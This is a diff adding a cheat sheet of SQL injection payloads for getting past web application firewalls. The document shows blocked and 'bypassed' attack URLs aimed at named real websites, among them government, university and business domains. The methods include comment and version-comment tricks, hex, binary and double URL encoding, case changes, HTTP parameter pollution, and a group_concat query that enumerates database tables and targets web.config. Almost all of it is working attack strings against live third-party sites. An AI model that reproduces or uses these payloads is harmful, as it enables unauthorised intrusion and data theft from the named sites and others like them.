@@ -1,0 +1,213 @@
+
+WAF Bypass Payloads for Fuzzing
+
+Normal URL
+http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330
+
+Packet Dropped - No reply - Detected By Firewall
+http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=.0 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
+
+Bypassed:
+http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=.0 union select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
+
+Web Application Firewall
+
+Normal URL
+http://bpc.gov.bd/contactus.php?id=4
+
+Detected By MOD Security
+http://bpc.gov.bd/contactus.php?id=4' UNION SELECT 1,2,3-- -
+
+Bypassed:
+http://bpc.gov.bd/contactus.php?id=.4'/*!50000UNION*//*!50000SELECT*/1,2,3,4,5,6,7-- -
+
+
+Different Types of Encoding
+WAFs are blocking these days like:
+
+Blocked True Conditions
+1 or 1=1
+1' or ''='
+1" or ""="
+1' or true#
+1" or true#
+1 or true#
+etc.
+
+Mix Up filters:
+
+or '1
+|| '1
+null' || 'a'=_binary'a
+1' || 'a'=x'61
+1' && '0'=x'30
+1' %26%26 %270%27%3dx'30
+2' && 0.e1=_binary"0
+1 or 1.e1=0b1010
+' || 1 like 1
+'-'
+"-"
+' || 2 not like 1
+110 or x'30'=48
+'1'!=20
+1 or 20!='1'
+2 and 2>0
+3 || 0<1
+12 || 0b1010<0b1011
+0b11 || 0b1010x'30'
+1 or 0b1
+2121/**/||21
+111' or _binary'1
+1 or 2121
+1' or 12 rlike '1
+
+
+Binary
+Select 1 from dual where 0b1010=10
+
+Hex Type 1
+Select 1 from dual where '0'=x'30'
+
+Hex Type 2
+Select 1 from dual where 0x30='0'
+
+Like statement
+Select 1 from dual where 1 like 1 
+
+Rlike Statement
+Select 1 from dual where 12 rlike 1
+
+|| (OR)
+Select 1 from dual where 1||1
+
+&& (And)
+
+Select 1 from dual where 1&&1
+
+Blocked:
+
+http://www.prizmconsulting.com.pk/news.php?actionvar=news&id=1 or 1
+http://www.prizmconsulting.com.pk/news.php?actionvar=news&id=1 or 1=1
+http://www.prizmconsulting.com.pk/news.php?actionvar=news&id=1 or 0>2
+
+Bypassed
+
+http://www.prizmconsulting.com.pk/news.php?actionvar=news&id=1 or ''=''
+http://www.prizmconsulting.com.pk/news.php?actionvar=news&id=1 || 0b1=x'31'
+http://www.prizmconsulting.com.pk/news.php?actionvar=news&id=1 ||'1'!=20
+http://www.prizmconsulting.com.pk/news.php?actionvar=news&id=1 || 1=1
+http://www.prizmconsulting.com.pk/news.php?actionvar=news&id=1 || 1 like 1
+http://www.prizmconsulting.com.pk/news.php?actionvar=news&id=1 || 12 rlike 1
+
+WAF bypass Payload:
+
+%55nion(%53elect)
+union%20distinct%20select
+union%20%64istinctRO%57%20select
+union%2053elect
+%23?%0auion%20?%23?%0aselect
+%23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect
+%55nion %53eLEct
+u%6eion se%6cect
+unio%6e %73elect
+unio%6e%20%64istinc%74%20%73elect
+uni%6fn distinct%52OW s%65lect
+%75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%74
+
+Example (Blocked)
+
+http://www.jenman.com.au/news_alert.php?id=.90 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%23
+
+URL Encoded Bypass
+
+http://www.jenman.com.au/news_alert.php?id=.90 unio%6e selec%74 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%23
+
+Example (Blocked)
+
+http://www.arconassoc.com/pages.php?page_id=.0union(select 1,2,3,4,5,6,7,8,9,10,11,12)
+
+URL Encoded Bypass
+
+http://www.arconassoc.com/pages.php?page_id=%2e%30%75%4e%49%4f%6e%28%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%29
+
+Normal Hex (Blocked)
+select 0x313131
+
+Hexed Bypass Version
+select x'313131';
+
+Binary Bypass
+select 0b011110100110010101101110;
+
+Bypass using functions
+select unhex(x'333133313331');
+
+Bypassed Link
+
+http://www.nat-net.com/forms/products/viewAllProducts.php?sc=1'UnION distinctrow Select 11-- -
+
+Routed Query under Hexed Payload Blocked
+
+http://www.nat-net.com/forms/products/viewAllProducts.php?sc=1'UnION distinctrow Select 0x2e312929556e494f6e2053656c65637420312c322c332c342c352c362c372c382c392c31302c31312c31322c31332c31342c31352c31362c313723-- --
+
+First we can rebypass it under Hex payload.
+
+http://www.nat-net.com/forms/products/viewAllProducts.php?sc=1'UnION distinctrow Select 0x2e312929556e494f6e2064697374696e63742053656c65637420312c322c332c342c352c362c372c382c392c31302c31312c31322c31332c31342c31352c31362c313723-- -
+
+Second we can use Hex in such a way firewall never expected
+
+http://www.nat-net.com/forms/products/viewAllProducts.php?sc=1'UnION distinctrow Select x'2e312929556e494f6e2053656c65637420312c322c332c342c352c362c372c382c392c31302c31312c31322c31332c31342c31352c31362c313723'-- -
+
+In a condition single Quotes are blocked we can use this bypass
+
+http://www.nat-net.com/forms/products/viewAllProducts.php?sc=1'UnION distinctrow Select 0b0010111000110001001010010010100101010101011011100100100101001111011011100010000001010011011001010110110001100101011000110111010000100000001100010010110000110010001011000011001100101100001101000010110000110101001011000011011000101100001101110010110000111000001011000011100100101100001100010011000000101100001100010011000100101100001100010011001000101100001100010011001100101100001100010011010000101100001100010011010100101100001100010011011000101100001100010011011100100011-- -
+
+One more way to bypass it
+
+http://www.nat-net.com/forms/products/viewAllProducts.php?sc=1'UnION distinctrow Select unhex('2e312929556e494f6e2053656c65637420312c322c332c342c352c362c372c382c392c31302c31312c31322c31332c31342c31352c31362c313723')-- -
+
+Lets say we have decided to use Hex anyway..so here is another bypass
+
+http://www.nat-net.com/forms/products/viewAllProducts.php?sc=1'UnION distinctrow Select replace(0x2e312929556e495f7a656e4f6e2053656c5f7a656e65637420312c322c332c342c352c362c372c382c392c31302c31312c31322c31332c31342c31352c31362c313723,(0x5f7a656e),'')-- -
+
+One more way to bypass even if Quotes are not available
+
+http://www.nat-net.com/forms/products/viewAllProducts.php?sc=1'UnION distinctrow Select unhex(0x32653331323932393535366534393466366532303533363536633635363337343230333132633332326333333263333432633335326333363263333732633338326333393263333133303263333133313263333133323263333133333263333133343263333133353263333133363263333133373233)-- -
+
+Example WAF (Blocked)
+
+http://www.premises.com.au/residetails.php?id=6145081 union select 1111,1222,1333&premflag=&searchcat=buy
+
+Bypassed With Double URL Encoding
+
+http://www.premises.com.au/residetails.php?id=6145081%2b%2575%256e%2569%256f%256e%2b%2573%2545%256c%2545%2563%2574%2b0x3133333731,1222,1333&premflag=&searchcat=buy
+
+Bypassing Case sensitive Filters
+
+
+/union.*select/
+and
+/union.*select/i
+
+
+Group_concat Blocked
+
+http://www.groffr.com/compare_projects.php?q=1495' and false /*!50000UNION*/ALL+SELECT*from(select /*!50000group_concat(shit SEPARATOR '')*/from(select 0x223e3c2f613e3c2f6469763e3c2f6469763e3c2f74683e3c2f74723e3c2f7461626c653e3c666f6e7420636f6c6f723d22726564223e3c62723e3c623e496e6a6563746564206279205a454e3c2f623e3c62723e56657273696f6e203a3a20 as shit /*!50000union*/select version()/*!50000union*/select 0x3c62723e4461746162617365203a3a20/*!50000union*/select database()/*!50000union*/select 0x3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d22677265656e223e3c753e3a3a205461626c657320466f756e64203a3a203c2f753e3c6c693e/*!50000union*/select/*!50000group_concat(table_name SEPARATOR 0x3c6c693e)*/from/*!50000InFormation_schema.tables*//*!50000where+*/table_schema=/*!50000database()*/)lol)a1 join(select(0x3133333732))a2 join(select(0x3133333733))a3 join(select(0x3133333734))a4 join(select(0x3133333735))a5 join(select(0x3133333736))a6--+
+
+Changing Case of Group_Concat to bypass
+
+http://www.groffr.com/compare_projects.php?q=1495' and false /*!50000UNION*/ALL+SELECT*from(select /*!50000GrOup_CoNcat(shit SEPARATOR '')*/from(select 0x223e3c2f613e3c2f6469763e3c2f6469763e3c2f74683e3c2f74723e3c2f7461626c653e3c666f6e7420636f6c6f723d22726564223e3c62723e3c623e496e6a6563746564206279205a454e3c2f623e3c62723e56657273696f6e203a3a20 as shit /*!50000union*/select version()/*!50000union*/select 0x3c62723e4461746162617365203a3a20/*!50000union*/select database()/*!50000union*/select 0x3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d22677265656e223e3c753e3a3a205461626c657320466f756e64203a3a203c2f753e3c6c693e/*!50000union*/select/*!50000group_coNcAt(table_name SEPARATOR 0x3c6c693e)*/from/*!50000InFormation_schema.tables*//*!50000where+*/table_schema=/*!50000database()*/)lol)a1 join(select(0x3133333732))a2 join(select(0x3133333733))a3 join(select(0x3133333734))a4 join(select(0x3133333735))a5 join(select(0x3133333736))a6--+
+
+
+Example WAF (Blocked)
+
+http://www.punjabkesari.com/frmNewsDetails.aspx?uid='union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,'web.config',20,21--
+
+There are loads of ways to bypass the above WAF but we are gonna use tricks using HPP
+
+http://www.punjabkesari.com/frmNewsDetails.aspx?uid='union--+&uid=*/%0aselect 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,'web.config',20,21--
+
+Lets try some other ways we can use HPP for Comma Filtered WAF
+
+http://www.punjabkesari.com/frmNewsDetails.aspx?uid='union--+&uid=*/%0aselect 1&uid=2&uid=3&uid=4&uid=5&uid=6&uid=7&uid=8&uid=9&uid=10&uid=11&uid=12&uid=13&uid=14&uid=15&uid=16&uid=17&uid=18&uid='web.config'&uid=20&uid=21--
+
